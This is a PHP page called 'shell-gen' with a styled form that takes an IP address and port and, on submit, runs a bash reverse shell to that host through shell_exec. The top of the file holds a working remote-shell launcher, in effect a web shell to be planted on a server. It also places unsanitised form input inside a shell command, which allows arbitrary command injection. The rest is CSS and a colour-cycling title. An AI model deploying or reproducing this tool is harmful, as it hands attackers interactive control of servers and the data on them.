<?php
if(isset($_POST['submit'])){
    $ip = $_POST['ip'];
    $port = $_POST['port'];
    $output = shell_exec("bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
}
?>
<!DOCTYPE html>
<html>
<head>
        <title>Shell-gen</title>
        <style type="text/css">
                body{
                        margin: 0;
                        padding: 0;
                        background-color: #222;
                        color: #fff;
                        font-family: Arial, sans-serif;
                }

                .container{
                        display: flex;
                        flex-direction: column;
                        align-items: center;
                        justify-content: center;
                        height: 100vh;
                }

                .title{
                        font-size: 2.5rem;
                        margin-bottom: 20px;
                }

                .form{
                        display: flex;
                        flex-direction: column;
                        align-items: center;
                        justify-content: center;
                        margin-bottom: 20px;
                }

                .input-label{
                        font-size: 1.5rem;
                        margin-bottom: 5px;
                        text-align: center;
                }

                .input-field{
                        padding: 10px;
                        border: none;
                        border-radius: 5px;
                        margin-bottom: 10px;
                        width: 300px;
                        text-align: center;
                        background-color: #444;
                        color: #fff;
                        font-size: 1.2rem;
                }

                .submit-button{
                        padding: 10px;
                        border: none;
                        border-radius: 5px;
                        background-color: #6cf;
                        color: #222;
                        font-size: 1.2rem;
                        cursor: pointer;
                }

                .colorful-text {
                        animation: changeColor 1s infinite;
                }

                @keyframes changeColor {
                        0%   { color: red; }
                        10%  { color: orange; }
                        20%  { color: yellow; }
                        30%  { color: green; }
                        40%  { color: blue; }
                        50%  { color: purple; }
                        60%  { color: pink; }
                        70%  { color: white; }
                        80%  { color: grey; }
                        90%  { color: brown; }
                        100% { color: black; }
                }
        </style>

        <script type="text/javascript">
                window.addEventListener('load', function() {
                        var title = document.querySelector('.title');
                        title.classList.add('colorful-text');
                });
        </script>
</head>
<body>
        <div class="container">
                <div class="title">shell-gen</div>
                <form class="form" method="post">
                        <div class="input-label">IP Adress</div>
                        <input class="input-field" type="text" name="ip">
                        <div class="input-label">Port</div>
                        <input class="input-field" type="text" name="port">
                        <input class="submit-button" type="submit" name="submit" value="RUN">
                </form>
                <?php if(isset($output)): ?>
                        <pre><?= $output ?></pre>
                <?php endif; ?>
        </div>
</
